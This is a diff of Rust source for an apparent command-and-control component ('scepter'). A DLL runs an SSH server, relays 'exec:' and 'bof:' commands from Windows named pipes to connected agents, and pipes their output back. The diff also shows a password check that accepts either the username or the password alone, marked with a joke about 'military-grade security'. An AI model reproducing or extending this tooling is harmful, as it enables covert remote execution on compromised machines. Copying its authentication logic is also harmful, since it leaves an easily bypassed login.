@@ -6,24 +6,50 @@ use std::collections::HashMap;
 use std::os::raw::c_void;
 use windows_sys::Win32::Foundation::{BOOL, HANDLE};
 
-use std::sync::Arc;
-use std::thread;
 use debug_print::{debug_eprintln, debug_println};
 use rand_core::OsRng;
 use russh::server::{Msg, Server as _, Session};
 use russh::*;
+use std::sync::Arc;
+use std::thread;
 use tokio::runtime::Runtime;
 use tokio::sync::Mutex;
 
 pub use scepter_common::*;
 
+static mut G_H_INPUT_PIPE: HANDLE = 0 as HANDLE;
+static mut G_H_OUTPUT_PIPE: HANDLE = 0 as HANDLE;
+
+#[cfg(debug_assertions)]
+fn initialize_handles() -> (Option<HANDLE>, Option<HANDLE>) {
+    (Some(0 as HANDLE), Some(0 as HANDLE)) // Just so we pass the check in debug mode
+}
+#[cfg(not(debug_assertions))]
+fn initialize_handles() -> (Option<HANDLE>, Option<HANDLE>){
+    (pipe::initialize_input_pipe(), pipe::initialize_output_pipe())
+}
+
 pub async fn dll_main() {
+
+    let pipes = initialize_handles();
+
+    // Check if either pipe is None, and return early if so
+    if pipes.0.is_none() || pipes.1.is_none() {
+        debug_println!("Failed to initialize one or both pipes");
+        return;
+    }
+
+    unsafe {
+        G_H_INPUT_PIPE = pipes.0.unwrap();
+        G_H_OUTPUT_PIPE = pipes.1.unwrap();
+    }
 
     let config = russh::server::Config {
         inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
         auth_rejection_time: std::time::Duration::from_secs(10),
         auth_rejection_time_initial: Some(std::time::Duration::from_secs(0)),
         keys: vec![
+            // TODO can probably make this a verifiable component so agent only talks to intended ssh server
             russh::keys::PrivateKey::random(&mut OsRng, russh::keys::Algorithm::Ed25519).unwrap(),
         ],
         preferred: Preferred {
@@ -37,7 +63,10 @@ pub async fn dll_main() {
         id: 0,
     };
 
-    let interface_ip = String::from_utf8_lossy(SSH_INTERFACE_IPV4_ADDRESS).to_string().trim_matches(char::from(0)).to_string();
+    let interface_ip = String::from_utf8_lossy(SSH_INTERFACE_IPV4_ADDRESS)
+        .to_string()
+        .trim_matches(char::from(0))
+        .to_string();
     // Clone sh if needed (if it's a type that implements Clone)
     let mut sh_clone = sh.clone();
 
@@ -55,9 +84,16 @@ pub async fn dll_main() {
         });
     });
 
-    let interface_port = str::from_utf8(SSH_PORT).unwrap().trim_matches(char::from(0)).parse::<u16>().unwrap();
+    let interface_port = str::from_utf8(SSH_PORT)
+        .unwrap()
+        .trim_matches(char::from(0))
+        .parse::<u16>()
+        .unwrap();
 
-    sh_clone.run_on_address(config, (interface_ip, interface_port)).await.unwrap();
+    sh_clone
+        .run_on_address(config, (interface_ip, interface_port))
+        .await
+        .unwrap();
 }
 
 #[derive(Clone)]
@@ -72,28 +108,40 @@ impl Server {
         debug_println!("Broadcasting to {} clients", clients.len());
         for (id, (channel, s)) in clients.iter_mut() {
             debug_println!("Sending to client {}", id);
-            match s.data(*channel, data.clone()).await {
-                Ok(_) => debug_println!("Successfully sent to client {}", id),
-                Err(e) => debug_println!("Failed to send to client {}: {:?}", id, e),
-            }
+            let _ = match s.data(*channel, data.clone()).await {
+                Ok(_) => {
+                    debug_println!("Successfully sent to client {}", id);
+                    id
+                },
+                Err(e) => {
+                    debug_eprintln!("Failed to send to client {}: {:?}", id, e);
+                    id
+                },
+            };
         }
     }
 
     #[cfg(not(debug_assertions))]
-    /// TODO Reads from input pipe and sends that shit to the agent
+    /// Reads from input pipe and sends that shit to the agent
     pub async fn command_loop(&mut self) {
-        let mut input = String::new();
-
-        match std::io::stdin().read_line(&mut input) {
-            Ok(_) => debug_println!("You typed: {}", input.trim()),
-            Err(err) => debug_eprintln!("Error reading line: {}", err),
+        loop {
+            let input = match unsafe { pipe::read_input(G_H_INPUT_PIPE) } {
+                None => continue,
+                Some(s) => s,
+            };
+            let input = input.trim_matches(char::from(0));
+            if input.eq("exit") {
+                std::process::exit(0);
+            }
+            if input.starts_with("exec:") || input.starts_with("bof:") {
+                self.post(CryptoVec::from(input)).await;
+            }
         }
-        let input = input.trim_matches(char::from(0));
-        self.post(CryptoVec::from(input)).await;
+
     }
 
     #[cfg(debug_assertions)]
-    /// Lets you run (1) test command to validate execution from agent
+    /// Lets you run commands to validate execution from agent
     pub async fn command_loop(&mut self) {
         loop {
             let mut input = String::new();
@@ -106,8 +154,7 @@ impl Server {
             if input.eq("exit") {
                 std::process::exit(0);
             }
-            if input.starts_with("cmd:"){
-                let input = input.replace("cmd:","");
+            if input.starts_with("exec:") || input.starts_with("bof:") {
                 self.post(CryptoVec::from(input)).await;
             }
         }
@@ -135,12 +182,24 @@ impl server::Handler for Server {
 
     async fn auth_password(&mut self, user: &str, pass: &str) -> Result<server::Auth, Self::Error> {
         // Believe it or not, this is military-grade security
-        let username = String::from_utf8_lossy(&*USERNAME).to_string().trim_matches(char::from(0)).to_string();
+        let username = String::from_utf8_lossy(&*USERNAME)
+            .to_string()
+            .trim_matches(char::from(0))
+            .to_string();
 
-        let password = String::from_utf8_lossy(&*PASSWORD).to_string().trim_matches(char::from(0)).to_string();
+        let password = String::from_utf8_lossy(&*PASSWORD)
+            .to_string()
+            .trim_matches(char::from(0))
+            .to_string();
 
-        let input_username = String::from_utf8_lossy(user.as_bytes()).to_string().trim_matches(char::from(0)).to_string();
-        let input_password = String::from_utf8_lossy(pass.as_bytes()).to_string().trim_matches(char::from(0)).to_string();
+        let input_username = String::from_utf8_lossy(user.as_bytes())
+            .to_string()
+            .trim_matches(char::from(0))
+            .to_string();
+        let input_password = String::from_utf8_lossy(pass.as_bytes())
+            .to_string()
+            .trim_matches(char::from(0))
+            .to_string();
 
         if input_username.eq(&username) || input_password.eq(&password) {
             return Ok(server::Auth::Accept);
@@ -154,7 +213,11 @@ impl server::Handler for Server {
         channel: Channel<Msg>,
         session: &mut Session,
     ) -> Result<bool, Self::Error> {
-        debug_println!("Client {} opened a session channel with ID: {}", self.id, channel.id());
+        debug_println!(
+            "Client {} opened a session channel with ID: {}",
+            self.id,
+            channel.id()
+        );
 
         // Store client in the HashMap
         let mut clients = self.clients.lock().await;
@@ -174,21 +237,19 @@ impl server::Handler for Server {
 
     async fn data(
         &mut self,
-        channel: ChannelId,
+        _channel: ChannelId,
         data: &[u8],
-        session: &mut Session,
+        _session: &mut Session,
     ) -> Result<(), Self::Error> {
         // Sending Ctrl+C ends the session and disconnects the client
         if data == [3] {
             return Err(russh::Error::Disconnect);
         }
 
-        debug_println!("Got data: {}", String::from_utf8_lossy(data));
+        let output_data = String::from_utf8_lossy(data);
 
-        let _data = CryptoVec::from(format!("Got data: {}\r\n", String::from_utf8_lossy(data)));
-        // self.post(data.clone()).await;
-        // session.data(channel, data)?;
-
+        debug_println!("Got data: {}", output_data);
+        unsafe { pipe::write_output(G_H_OUTPUT_PIPE, output_data.as_ref()); };
         Ok(())
     }
 }
